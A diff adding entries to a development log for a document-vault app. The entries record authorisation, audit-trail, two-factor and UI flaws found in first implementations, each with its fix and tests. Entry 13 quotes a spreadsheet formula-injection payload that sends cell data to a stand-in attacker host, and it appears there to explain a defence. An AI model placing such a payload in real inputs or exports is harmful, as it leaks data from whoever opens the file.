@@ -241,6 +241,239 @@ listed and reports `SOURCE CHANGED DURING RUN - rerun` instead of a verdict; the
 
 ---
 
+## 2026-10-22 - 12. Authorisation: a share link opened documents for people with no grant  *(authorisation, audit trail)*
+
+**Asked:** (Phase 1 spec, section 4) "A link only works when signed in as the intended recipient, who must still hold a
+valid grant. ... The server rejects the link if ... the grant was revoked or has expired." And section 2: record the
+reasons `no_grant, grant_expired, link_expired, link_revoked, wrong_user, view_only, not_found`; only admins can see them.
+
+**Produced:** links bound to one recipient, signed, 5 minutes, with `access_version` - but the link itself was treated as
+the access: `check_access()` took "the better of the grant and the link", so a link made for someone **without any
+grant** opened the document for 5 minutes, and a "download" link raised a View-only person to download. My own reason
+names (`link_wrong_recipient`, `view_cannot_download`, `document_not_found`) differed from the spec's, and owners could
+read the refusal reasons in their document's activity list.
+
+**What was wrong:** a link was a second, independent way in. Revoking someone's grant killed their links only because
+revoking also bumped `access_version` - a coincidence, not the rule - and an owner could hand a 5-minute download pass to
+someone they had only ever given View. The spec's own reason names were what an assessor would search the audit log for.
+No test failed: the tests had been written to the same wrong understanding. Found by re-reading the original spec word
+by word before Phase 2.
+
+**What I did instead:** a request through a link now needs a valid link **and** a live grant; the link can only narrow the
+grant's level (`AUTHZ-CHECK[link-level-caps-action]`); a link can only be made for someone who already has access, at
+most at their level (`link-recipient-needs-grant`, `link-not-above-grant`); a request that came through a link must have a
+valid link even if a grant exists (spec step 6). Reasons renamed to the spec's; the owner's activity endpoint strips them
+(`tests/test_audit.py::test_only_admins_see_why_a_request_was_refused`). New tests:
+`tests/test_authz_unit.py::test_a_link_never_gives_access_on_its_own`, `test_a_request_through_a_bad_link_is_refused_even_with_a_grant`,
+`tests/test_links.py::test_a_link_is_only_for_someone_who_already_has_access`, `test_link_dies_with_the_grant_behind_it`,
+`test_link_works_at_4_59_and_fails_at_5_01`. 45/45 mutants killed afterwards.
+**Fixed in:** Phase 2 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-22 - 13. Audit export: a username could run as a spreadsheet formula  *(audit trail)*
+
+**Asked:** (Phase 3 spec) "Export filtered results to CSV, include the SHA-256 of the exported file, and log the export."
+
+**Produced:** the first plan wrote rows with Python's `csv` module (quoting every cell) and treated that as escaping.
+
+**What was wrong:** quoting stops a comma from splitting a cell; it does not stop Excel or LibreOffice from *running*
+a cell that starts with `=`, `+`, `-` or `@`. And the audit trail is full of attacker-chosen text: a failed sign-in records
+whatever was typed as the username (`=HYPERLINK("http://evil.example/?"&A1,"Click for details")`), and every row records the
+user agent. The administrator - the person most likely to open the export - would be the victim. The upload validator
+already refused CSV formula injection in *uploaded* files; the same attack had simply not been considered for a file the
+app *produces*.
+
+**What I did instead:** `routes/admin.csv_cell()` prefixes any cell starting with `=`, `+`, `-`, `@`, tab, CR or LF with
+`'` (the OWASP rule), tagged `AUTHZ-CHECK[csv-formula-neutralised]` so the mutation tool proves a test notices if it is
+removed. The audit trail keeps the exact text; only the export is neutralised. Test:
+`tests/test_audit_page.py::test_exported_cells_cannot_run_as_spreadsheet_formulas` (signs in as three formulas with a
+formula user agent, then checks no exported cell starts with a formula character); the attack script does the same against
+the running server. THREATS.md T70. 46/46 mutants killed afterwards.
+**Fixed in:** Phase 3 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-22 - 14. Audit trail: "events from the same session" without leaking the session or breaking the chain  *(audit trail)*
+
+**Asked:** (Phase 3 spec) "Clicking a row opens a detail panel showing the full event, user agent, hash, and other events
+from the same session." Plus the spec's hash fields and "write a migration that backfills hashes for existing rows".
+
+**Produced:** the obvious design - store the session's `token_hash` in each audit row, add it to the hashed fields, and
+backfill by updating old rows.
+
+**What was wrong:** three things. (1) `token_hash` is the primary key of the live `sessions` table; copying it into the
+audit trail (which administrators read and export) puts a session lookup key in every export. (2) Adding a column to the
+hash input changes the hash of every row already written, so the first "Verify integrity" after the upgrade would report
+the whole trail as tampered - or the "fix" would be to re-hash history, which is exactly what the chain exists to prevent.
+(3) A backfill by `UPDATE` needs the append-only triggers switched off, breaking the rule "no code path may update or delete
+audit rows".
+
+**What I did instead:** `security.session_ref()` - 16 hex characters of a separately labelled SHA-256 of the token hash,
+useless as a credential. The new column is hashed **only when set**, so every v3 row keeps its original hash and the
+upgrade is a plain `ADD COLUMN`. A pre-chain audit table is *copied* through the normal insert path into the chained table
+(never updated), and the upgrade itself is recorded as `audit.migrated`. Tests:
+`tests/test_audit_page.py::test_detail_panel_lists_other_events_from_the_same_session` (neither the token nor its hash
+appears anywhere in the trail), `tests/test_migrations.py::test_a_v3_database_is_upgraded_in_place_and_its_chain_still_verifies`
+(old rows byte-identical), `test_an_audit_table_without_hashes_gets_them_backfilled`. THREATS.md T73, T74.
+**Fixed in:** Phase 3 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-22 - 15. Audit page: "Show this session" showed one event, and "Clear" sent a click as a filter  *(other: UI)*
+
+**Asked:** build the audit page UI for the new endpoints.
+
+**Produced:** a detail panel with *Show this session in the table*, and a *Clear* button wired as `onclick: clearAll`.
+
+**What was wrong:** found by the scripted browser walk-through (Playwright, desktop and phone screenshots), not by the API
+tests. *Show this session* added the session filter on top of whatever was already filtered - with the action set to
+"Open document" it showed 1 event instead of the session's 7. After `clearAll` gained an optional parameter, the *Clear*
+button passed the click event in as that parameter, so the page asked the server for `session=[object PointerEvent]` and
+got a 422. The API was right both times; the page was not.
+
+**What I did instead:** *Show this session* clears every other filter first; *Clear* calls `clearAll()` with no argument.
+Re-ran the walk-through: the panel lists 7 events and the table shows the same 7. Also from the screenshots: sequence
+numbers and IP addresses wrapped one character per line, and hover stuck on phones after a tap - fixed in `style.css`.
+**Fixed in:** Phase 3 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-23 - 16. Two-step sign-in: forced set-up would have locked the judges out of the demo  *(access control)*
+
+**Asked:** (Phase 7 spec) "TOTP two-factor authentication for admins and owners: QR enrolment, backup codes, and
+enforcement at login. Audit enrolment and failures." - done before Phases 4-6, at my request.
+
+**Produced:** a correct design for real use: an administrator or owner without two-step sign-in gets no session after
+the password, only a set-up step with a QR code; the first valid code turns it on.
+
+**What was wrong:** the hand-in requires *shared* demo logins in the README. With forced set-up, the first judge to sign
+in as `admin` would scan the QR code with their own phone - and from then on every other judge would be asked for a code
+from a phone they do not have. The security was right and the demo would have been broken for everyone after the first
+person. It was also untestable from the attack script, which signs in as admin and owner.
+
+**What I did instead:** the seed enrols the demo `admin` and `owner` with keys published in the README (with QR images
+and `scripts/demo_code.py`), stated as a demo-only exception in THREATS.md; the forced QR set-up is demonstrated with a
+newly created owner. The attack script computes codes from the published keys. A code never works twice, so two judges
+in the same 30 seconds get "wait for the next code" rather than a silent replay. Tests:
+`tests/test_seed.py::test_a_fresh_seed_signs_in_with_the_published_demo_keys`,
+`tests/test_two_factor.py::test_an_administrator_must_set_it_up_before_any_session_exists`, `test_a_code_never_works_twice`.
+**Fixed in:** Phase 7 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-23 - 17. Access control: the admin user list would have shipped every TOTP key to the browser  *(access control)*
+
+**Asked:** add the two-step columns (`totp_secret`, `totp_pending`, `totp_last_step`) to `users`.
+
+**Produced:** the columns, sealed with AES-GCM - but the existing admin endpoint `GET /api/admin/users` was written as
+`SELECT u.* ...` and only removed `password_hash` before returning each row.
+
+**What was wrong:** every new column of `users` would silently flow to every administrator's browser - including the
+sealed key and the half-finished key of someone moving to a new phone. Sealed is not a reason to hand it out: the admin
+must never be able to read (or replay) another person's second factor. A related trap: an admin who could reset their
+*own* two-step sign-in would let a stolen admin session strip its own protection.
+
+**What I did instead:** the user list strips every secret column and reports only `two_factor: true/false`; a test
+asserts no response ever contains `totp_secret`, `totp_pending` or `password_hash`, and the AI context file now says
+"never `SELECT u.*` into a response". Admins can reset someone else's two-step sign-in (lost phone - audited, alerted,
+their sessions end) but not their own (`AUTHZ-CHECK[admin-cannot-reset-own-2fa]`). Tests:
+`tests/test_two_factor.py::test_secrets_and_backup_codes_are_never_stored_in_clear`,
+`test_an_administrator_can_reset_someone_who_lost_their_phone`; attack script "no two-step secret ever leaves the server".
+64/64 mutants killed afterwards.
+**Fixed in:** Phase 7 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-23 - 18. UI: the code field's pattern was an invalid regular expression  *(other: UI)*
+
+**Asked:** a code input that accepts a 6-digit code or a backup code like `xxxx-xxxx`.
+
+**Produced:** `pattern="[0-9A-Za-z -]{6,12}"` on the input.
+
+**What was wrong:** current browsers compile `pattern` with the regular-expression `v` flag, where a bare `-` inside a
+character class is a syntax error. Chrome logged "Pattern attribute value ... is not a valid regular expression" on every
+sign-in page and simply ignored the attribute. Found by the scripted browser walk-through, which fails on any console
+error; no API test could have seen it.
+
+**What I did instead:** removed the attribute (the server already validates and normalises the code, and the browser
+check added nothing). Re-ran the walk-through: no console errors. Also from that walk-through: a test user's password was
+refused because it contained the username - the policy working as intended.
+**Fixed in:** Phase 7 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-23 - 19. Authorisation tests: the mutation check found the first-code check untested  *(authorisation)*
+
+**Asked:** write the tests for two-step sign-in (26 by the end), then run `tools/mutation_check.py` on the frozen code.
+
+**Produced:** 25 tests covering wrong codes at sign-in, replay, lockout, backup codes, turning it off, admin reset... and
+none that sent a *wrong* code to the first-time set-up step (`/api/auth/login/enroll`). Every enrolment test used a valid
+code.
+
+**What was wrong:** the mutation check removed `if step is None:` in `login_enroll` (`AUTHZ-CHECK[enrolment-needs-a-working-code]`)
+and the whole suite still passed: **63/64**. With that check gone, an administrator's account could be "protected" by a
+key nobody had proven they hold - any six digits would have completed set-up and opened a session. The code was right;
+nothing proved it would stay right.
+
+**What I did instead:** added `tests/test_two_factor.py::test_first_time_set_up_needs_a_working_code` (a wrong first code
+returns 401, opens no session, enables nothing, issues no backup codes and is audited `auth.2fa_failed` / `stage: enroll`;
+the right code on the same attempt then works). Re-ran that mutant: killed. Both runs are in `docs/mutation_report.txt`.
+This is the tool doing its job - the same lesson as entry 10: a check is only as good as the test that fails without it.
+**Fixed in:** Phase 7 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-23 - 20. Authorisation: the label-change route arrived without its row in the access matrix  *(authorisation)*
+
+**Asked:** (Phase 4 spec) "Classification labels: Public / Internal / Confidential, chosen at upload (default Internal)
+and changeable later, every change audited."
+
+**Produced:** `PUT /api/documents/{id}/classification`, starting with `require_access(..., Action.CLASSIFY)` like every
+document route (owner-only: *classify* is in no permission level), audited as `document.classified`, with its own tests. No row for it in the authorisation matrix.
+
+**What was wrong:** the matrix is where every document route is attacked by all nine kinds of caller - Edit, Download
+and View holders, no grant, an expired grant, an admin, anonymous - with the uniform 403, no side effect and the right
+reason in the trail checked for each. Without a row, the route that can *lower* a Confidential label sat outside the
+one place that guarantees every document route meets every kind of caller. `tests/test_authz_matrix.py::test_matrix_covers_every_document_route` lists every
+`{doc_id}` route in the app and failed: the new route was not covered.
+
+**What I did instead:** added the *classify* row to the matrix, so the route is checked against all nine callers like
+every other one (now 162 cases; reasons such as `edit_cannot_classify`, `download_cannot_classify`, `view_only`,
+`admin_never_reads_content`), plus `tests/test_classification.py::test_only_the_owner_can_change_it`. That structural
+test is the guard rail I want: a new route cannot ship without every kind of caller being thrown at it. The seven new
+Phase 4 checks were then mutation-tested on the frozen code - 7/7 killed - and the full run is in
+`docs/mutation_report.txt`.
+**Fixed in:** Phase 4 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
+## 2026-10-23 - 21. UI: owners never saw new requests, and the activity list showed raw event names  *(other: UI)*
+
+**Asked:** "The owner sees pending requests and approves or denies." - plus my standing rule to walk every new screen in
+a real browser before calling a phase done.
+
+**Produced:** a *Requests waiting for you* panel on the owner's Documents page, an API that returned the requests
+correctly, and 15 API tests that all passed.
+
+**What was wrong:** the scripted browser walk-through (viewer asks, owner looks) timed out: the owner was already on
+Documents, clicked **Documents** again, and nothing happened - the address (`#/documents`) did not change, so the page
+never reloaded and the new requests never appeared. A real owner would have concluded nobody had asked. The screenshots
+showed two more defects no API test can see: the document's activity list printed `access.request_approved` and
+`access.requested` instead of words, and the Confidential notice put its lock icon on a line of its own. I had also
+approved the request for *Board minutes* - the seed document whose description says Vikram must never reach it - in
+the walk-through.
+
+**What I did instead:** a navigation link for the page you are already on now reloads that page; the five new audit
+events have plain words in the activity list; the notices keep their icon beside the text. The walk-through now
+approves *Audit papers* and denies *Board minutes* ("Only the board members"), matching the seed and the demo script.
+Re-ran it: owner sees both requests, approves one, denies the other; the viewer sees *Approved* with a countdown and
+*Denied* with the reason; the Confidential page carries `CONFIDENTIAL · viewer · <time>`; no console errors; phone width
+checked.
+**Fixed in:** Phase 4 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main
+
+---
+
 ## Template for the next entries
 
 ```
